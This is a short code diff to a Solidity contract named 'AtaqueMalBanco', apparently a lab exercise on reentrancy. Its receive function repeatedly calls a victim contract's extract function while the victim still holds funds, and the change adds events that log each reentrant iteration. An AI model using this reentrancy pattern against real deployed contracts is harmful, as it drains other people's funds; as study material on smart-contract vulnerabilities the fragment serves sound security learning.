@@ -10,13 +10,25 @@ contract AtaqueMalBanco{
     uint private amount;
 
     event SuccessfullAttack(bool success);
+    event IterationAttack(bool hasBalance);
+    event IterationWorked();
+    event IterationNotWorked();
     
     receive () external payable {
         uint victimBalance = address(victim).balance;
         bool has_funds = victimBalance >= msg. value ;
 
+        emit IterationAttack(has_funds);
+
         if ( has_funds ) {
-            try victim.extract(msg.value) {} catch {}
+            try victim.extract(msg.value)
+            {
+                emit IterationWorked();
+            }
+            catch 
+            {
+                emit IterationNotWorked();
+            }
         }
     }
 
